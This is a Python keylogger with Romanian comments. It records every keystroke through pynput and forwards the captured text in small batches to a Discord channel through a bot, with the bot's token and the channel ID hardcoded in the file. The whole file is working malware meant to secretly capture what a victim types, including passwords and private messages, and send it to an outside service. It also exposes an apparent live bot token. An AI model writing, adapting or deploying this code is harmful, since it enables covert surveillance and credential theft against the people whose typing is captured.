import discord
from pynput.keyboard import Listener, Key
import asyncio

# Redirecționează printările către un fișier
import sys
sys.stdout = open('keylogger.log', 'a')

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

CHANNEL_ID = 1345177180912746559  # Înlocuiește cu ID-ul canalului tău

@client.event
async def on_ready():
    print(f'Botul este logat ca {client.user}')
    global channel
    channel = client.get_channel(CHANNEL_ID)
    if channel:
        print(f'Canalul {channel.name} este gata pentru a trimite mesaje.')
    else:
        print('Canalul nu a fost găsit!')

# Vom stoca tastele într-o listă pentru a le trimite în ordinea corectă
key_buffer = []

def on_press(key):
    try:
        key_str = f"{key.char}"
    except AttributeError:
        if key == Key.space:
            key_str = " [SPACE] "
        elif key == Key.enter:
            key_str = " [ENTER] "
        elif key == Key.tab:
            key_str = " [TAB] "
        elif key == Key.shift:
            key_str = " [SHIFT] "
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            key_str = " [CTRL] "
        elif key == Key.alt_l or key == Key.alt_r:
            key_str = " [ALT] "
        elif key == Key.backspace:
            key_str = " [BACKSPACE] "
        elif key == Key.esc:
            key_str = " [ESC] "
        else:
            key_str = f" [SPECIAL_KEY {key}] "

    key_buffer.append(key_str)

    if len(''.join(key_buffer)) >= 10:
        message = ''.join(key_buffer)
        if channel:
            client.loop.create_task(channel.send(message))
        key_buffer.clear()

def on_release(key):
    if key == Key.esc:
        return False

listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

client.run('MTM0NTE3NjE4OTQwMDEyNTQ3Mg.GFgqIs.nl_SkggLAsTQ-e61JrRONliRLpbMPySPehB484')
